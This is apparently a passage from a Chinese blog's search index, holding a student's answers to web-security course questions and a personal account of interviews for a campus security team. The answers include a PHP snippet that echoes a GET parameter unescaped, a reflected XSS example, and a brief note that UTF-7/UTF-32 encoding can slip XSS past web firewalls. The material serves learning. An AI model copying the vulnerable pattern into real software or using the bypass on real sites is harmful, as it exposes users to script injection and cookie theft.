alt="QQ截图20220215145358"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215144737.png" alt="QQ截图20220215144737"></p><p>帮婆婆拖地去了，明天就要走了。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nepnep见习队员任务（不完整）</title>
    <link href="/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/"/>
    <url>/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Nepnep见习队员"><a href="#Nepnep见习队员" class="headerlink" title="Nepnep见习队员"></a>Nepnep见习队员</h1><h2 id="初学-视频1"><a href="#初学-视频1" class="headerlink" title="初学-视频1"></a>初学-视频1</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222652.png" alt="QQ截图20220217222652"></p><p>去youtube上找了翻译嘿嘿。<a href="https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj">https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj</a> （字幕自带翻译）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222851.png" alt="QQ截图20220217222851"></p><p>这里就先回答第一个问题。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（<span class="hljs-number">5</span>分）<br><br><span class="hljs-attribute">bp</span>（抓包） 和 firefox（设置代理方便）<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）<br><br>体会太多啦~~<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>if(isset($_GET[ &#x27; name &#x27; ]))&#123;<br>echo &quot;&lt;h1&gt;Hello &#123;$_GET[&#x27;name&#x27;]&#125; !&lt;/h1&gt;&quot;;<br>&#125;<br>?&gt;<br>如果get方法存在name变量声明，则输出name的值。<br>&lt;form method=&quot;GET&quot;&gt;<br>Enter your name: &lt;input type=&quot;input&quot; name=&quot;name&quot;&gt;&lt;br&gt;<br>&lt;input type=&quot; submit&quot;&gt;<br>那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）<br>服务端：前面部分 客户端：后面部分<br>    <br>客户端是通过传递什么参数来控制服务端代码的？（1分）<br>get<br><br>客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）<br>xss，反射。反射直接在网页中回显。<br>    <br>思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）<br>盗取cookie。<br>预防：1、过滤参数（但是无法完全实现），比如URL和参数进行各种的编码，比如escape, encodeURI, encodeURIComponent, 16进制，10进制，8进制，来绕过XSS过滤。<br>    2、黑白名单结合<br></code></pre></td></tr></table></figure><h2 id="初学-视频2"><a href="#初学-视频2" class="headerlink" title="初学-视频2"></a>初学-视频2</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）<br>注入、失效身份认证和会话管理、跨站脚本XSS、失效的访问控制、安全配置错误、敏感信息泄露、跨站请求伪造CSRF、使用含有漏洞的控件、攻击检测和防范不足、未受保护的 APIs、不安全的反序列化、不足的日志记录和监控<br><br>肯定是常见，因为每个漏洞都很常见。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/owasp-top-10.jpg.imgw.850.x.jpg" alt="owasp-top-10.jpg.imgw.850.x"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.请翻译一下credential stuffing（1分<br><br>证书填充<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">3.</span>为什么说不充分的日志记录<span class="hljs-comment">(insufficient logging)</span>也算owasp十大漏洞的一种？他的危害性如何（<span class="hljs-number">2</span>分）<br><br>攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。比如日志没有记录登录失败，那么攻击者可能就可以通过暴力破解多次进行登录尝试，但是日志中却没有记录。这就可能让攻击者成功入侵系统并隐匿自己的行踪。这个看似危害不大但却是十分严重的危害，因为一个日志系统不完善的服务器很容易遭受攻击并且在遭受攻击后无法判断攻击来源，这样就无法做出相应的防御，很可能再次遭受同样的攻击。<br><br>只要是漏洞都严重。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（<span class="hljs-number">3</span>分）<br><br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">5.</span>you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> you notes<br>   you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> things you can refer <span class="hljs-keyword">to</span><br>结合这两句话谈谈你的感想。（<span class="hljs-number">2</span>分）<br><br>我正在做的事情。<br></code></pre></td></tr></table></figure><h2 id="初学-视频3"><a href="#初学-视频3" class="headerlink" title="初学-视频3"></a>初学-视频3</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-number">1</span>.http报文的结构是什么？（<span class="hljs-number">1</span>分）<br><br><span class="hljs-number">1</span>、方式(<span class="hljs-keyword">method</span>)：客户端希望服务器对资源执行的动作，是一个单独的词，比如，<span class="hljs-title function_">GET</span>、<span class="hljs-title function_">POST</span>或<span class="hljs-title function_">HEAD</span><br><br>2、请求<span class="hljs-title function_">URL</span><span class="hljs-params">(request-URL)</span>：要直接与服务器进行对话，只要请求<span class="hljs-title function_">URL</span>是资源的绝对路径就可以了，服务器可以假定自己是<span class="hljs-title function_">URL</span>的主机/端口<br><br>3、版本<span class="hljs-params">(version)</span>：报文所使用的<span class="hljs-title function_">HTTP</span>版本。其格式：<span class="hljs-title function_">HTTP</span>/&lt;主要版本号&gt;.&lt;次要版本号&gt;<br><br>4、状态码<span class="hljs-params">(status-code)</span>：状态码是三位数字，描述了请求过程中所发生的情况。每个状态码的第一位数字都用于描述状态的一般类别<span class="hljs-params">(比如，“成功”、“出错”等等)</span><br><br>5、原因短语<span class="hljs-params">(reason-phrase)</span>：数字状态码的可读版本，包含行终止序列之前的所有文本。原因短语只对人类有意义，因此，尽管响应行<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">NOT</span> <span class="hljs-title function_">OK</span>和<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">OK</span>中原因短语的含义不同，但同样都会被当作成功指示处理<br><br>6、头部<span class="hljs-params">(header)</span>：可以有零个或多个头部，每个首部都包含一个名字，后面跟着一个冒号<span class="hljs-params">(:)</span>，然后是一个可选的空格，接着是一个值，最后是一个<span class="hljs-title function_">CRLF</span>首部是由一个空行<span class="hljs-params">(CRLF)</span>结束的，表示了头部列表的结束和实体主体部分的开始<br><br>7、实体的主体部分<span class="hljs-params">(entity-body)</span>：实体的主体部分包含一个由任意数据组成的数据块，并不是所有的报文都包含实体的主体部分，有时，报文只是以一个<span class="hljs-title function_">CRLF</span>结束。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217225853.png" alt="QQ截图20220217225853"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">2.</span>什么是<span class="hljs-literal">crlf</span>？在<span class="hljs-keyword">http</span>报文的哪个位置。（<span class="hljs-number">1</span>分）<br>已答。回车换行，每行末位。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.解释下这几个头的含义（<span class="hljs-number">5</span>分）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217230327.png" alt="QQ截图20220217230327"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">4</span>、cookie具有哪些特点，不同的域名和子域名对cookie有怎样的权限？Cookie的Secure和 HTTPOnly这两个flag分别有什么作用？请结合xss攻击来进行说明（<span class="hljs-number">3</span>分）<br><br>以键值对的形式临时存在。为域名设置的cookie，子域名也可读。子域名只可写自身的cookie。<br><br><span class="hljs-symbol">Secure:</span>限制只有通过https访问时才能传递cookie<br><br><span class="hljs-symbol">httponly:</span>阻止JavaScript读取cookie，可防xss攻击<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">5.简述本视频提到的xss绕过web防火墙的方案（5分）<br>用UTF<span class="hljs-string">-7</span>/UTF<span class="hljs-string">-32</span>编码payload<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">6.内容嗅探是什么？主要有哪些类型？请分别举例，主要用途是什么？在什么情况下可以利用这些漏洞？。为什么facebook等网站需要使用不同的域名来存储图片？（5分）<br>通过解析文件的内容，来猜测MIME类型的格式。有浏览器嗅探和客户端嗅探。客户端嗅探可用来判断浏览器为什么浏览器。<br><br>有些MIME类型是可执行类型，可以通过混淆MIME嗅探算法来执行XSS。<br><br>防止内容嗅探。<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">7.同源策略是什么？限制是什么？浏览器在遇到哪两种情况的时候会用到同源策略？如何放松SOP限制？放松SOP限制会对浏览器插件安全造成怎样的破坏？<br><br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">8.</span>csrf是什么？如何设计规避csrf？视频中提到的错误的csrf配置方法是什么？<br>跨站请求伪造。<br><br>验证<span class="hljs-built_in">token</span>，验证HTTP请求的Referer，还有验证XHR里的自定义<span class="hljs-built_in">header</span>。<br><br>没有对请求来源进行验证/过滤<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">附加题：5、6两点主要利用的是由于服务端和客户端对同一信息的处理方式不同造成的漏洞，你还能举出相似的例子么？（1分）<br>SSTI<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>历程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>进入道格的那些事</title>
    <link href="/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="记录进入道格的那些事"><a href="#记录进入道格的那些事" class="headerlink" title="记录进入道格的那些事"></a>记录进入道格的那些事</h1><p>由于换了电脑，每次给中哥交报告的时候，中哥都会说做个图床吧。害，之前的截图不见了（自己又去截图了下）。</p><p>有一说一感觉进道格有个手就行（可能神经有点不正常emmmm~~），但是没想到这一路过来这么坎坷。</p><h2 id="第一次面试"><a href="#第一次面试" class="headerlink" title="第一次面试"></a>第一次面试</h2><p>在第一次面试之前，已经水了一个学期了。我一直觉得我跟大二的学生一个水平（蜜汁自信），后来发现大二的学生都是可以自主分析pop链了，而我还沉迷在基本漏洞。然后第一次面试，在开学的那几天，然后第一次遇见中哥，进行了开开心心的面试（中哥太友好了，跟他的正经不匹配）。当然这第一次也没有正式进入道格。但是被夸了基础好，不知道是鼓励的话还是什么话。然后学学java，然后就步入了漫长的学习。中哥对熊海的评价，后面想了一晚上，第二天跟中哥深深的交流了一下。做好决定认真学！</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A53.png" alt="中哥3"></p><h2 id="第二次面试"><a href="#第二次面试" class="headerlink" title="第二次面试"></a>第二次面试</h2><p>终于经历了1个半月的学习java，再一次来面试。我信心十足，也许我才20岁，对任何事都是充满了信心。我再一次觉得我肯定能进道格了。面试也不错，中哥也说我进度跟的不错，但是他尽然让我自我介绍一下！！！！（必须吐槽一下）人都给我整傻了。结束的时候他说，要团队商量下。害~~，我这自信再一次被打击。不过这次的打击跟上一次不同，我感觉在逗我玩呢。但是没办法确实实力不足，也许我会的跟大二的一样多，pop链我也可以信手沾来，中哥就不会一而再的犹豫~，不过他一如既往的好，让我当了个道格实习成员。（我怀疑这是史无前例的），然后进入最终考核，挖洞！我以前想都不敢想。记得第一次面试之前，中哥让我审计熊海cms我当时候，看到那么多的代码，真的是傻乎乎，无从下手。忘记说了！是那个道格管理员说他叫陈嘉莉！！！我一直以为是个学姐，还是个温柔的学姐！！后来才知道是个男生！</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A52.png" alt="中哥2"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A5.png" alt="中哥"></p><h2 id="继一、二次面试感受"><a href="#继一、二次面试感受" class="headerlink" title="继一、二次面试感受"></a>继一、二次面试感受</h2><p>前前后后一个半月吧。给我的最大感受就是，学习信安的这条路上要少走弯路，但是不要怕走弯路，二者都可以给你同等的成长。谢谢在我的大二上的这学期，让我碰到中哥。</p><p>他还不把学习资料让我白嫖，至今我还是不能理解为什么！！！也许后面我会懂~~~是不是他觉得太便宜了。200可以跟女朋友撸管两次了。</p><p>学技术路上碰到这样一位恩师？哈哈哈哈哈我觉得肯定是能够算的上我师父的，学习路上让我少打点王者，问问题也会抽空回答我。太爱了！！！</p><p>前前后后还有很多事。有些太麻烦了，就懒得说了。害~~，希望我未来的道路上，能够遇到很多中哥这样的人！好好做好接下来的任务….马上就要进入道格了！坚持！</p><h2 id="第三次面试"><a href="#第三次面试" class="headerlink" title="第三次面试"></a>第三次面试</h2><p>太久了，忘记了哈哈哈哈~~</p><h2 id="最后一次"><a href="#最后一次" class="headerlink" title="最后一次"></a>最后一次</h2><p>中哥太忙了。结果是别的师傅面试的。（说实话自己不应该进道格的，但是给了我这个机会，就好好把握住。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220224203017.png" alt="QQ截图20220224203017"></p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>历程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
